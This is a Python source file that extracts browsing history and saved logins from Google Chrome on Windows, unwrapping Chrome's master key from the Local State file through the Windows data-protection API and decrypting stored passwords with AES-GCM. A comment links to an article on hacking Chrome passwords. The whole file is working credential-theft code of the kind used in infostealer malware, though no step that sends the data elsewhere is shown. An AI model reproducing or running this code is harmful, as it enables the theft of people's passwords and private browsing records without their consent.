import os
import json
from sqliteToJSON import sqliteToJson, getAllRecordsInTable
import shutil
import base64
import win32crypt
from Cryptodome.Cipher import AES


def cleanUpTemp():
    folder = "./temp"
    try: shutil.rmtree(folder)
    except Exception as e: print(e)
    os.makedirs(folder)

class Chromium():
    def __init__(self, enviromentPath = "LOCALAPPDATA", profileAppention = "Default", path="Google\\Chrome\\User Data", company="Google") -> None:
        cleanUpTemp()
        self.cleanup = cleanUpTemp

        self.company = company

        self.PATH = f"{os.getenv(enviromentPath)}\\{path}"
        self.ALL_FILES = os.listdir(self.PATH)

        self.PATH_DEFAULT = self.PATH + f"\\{profileAppention}"
        self.ALL_FILES_DEFAULT = os.listdir(self.PATH_DEFAULT)

    def getRecordsInTable(self, fName, tablePath):
        if fName not in self.ALL_FILES_DEFAULT: return
        dest = f"./temp/{self.company}/{fName}.sqlite"
        try: os.makedirs(f"./temp/{self.company}")
        except Exception as e: pass
        shutil.copy(self.PATH_DEFAULT + f"\\{fName}", dest)
        urlsJSON = getAllRecordsInTable(tablePath, dest)
        return urlsJSON

    def getHistory(self):
        return self.getRecordsInTable("History", "urls")

    def getLoginData(self):
        return self.getRecordsInTable("Login Data", "logins")

    def getLocalState(self):
        path = self.PATH + f"\\Local State"
        with open(path, "r") as f:
            return json.loads(f.read())
         
    def getSecretKey(self):
        localStatejson = self.getLocalState()
        encryptedKey = localStatejson['os_crypt']["encrypted_key"]
        secret_key = base64.b64decode(encryptedKey)
        
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decryptPassword(self, ciphertext, secret_key):
        # https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]

            cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
            decrypted_pass = cipher.decrypt(encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print("[ERR] Unable to decrypt password")
            return ""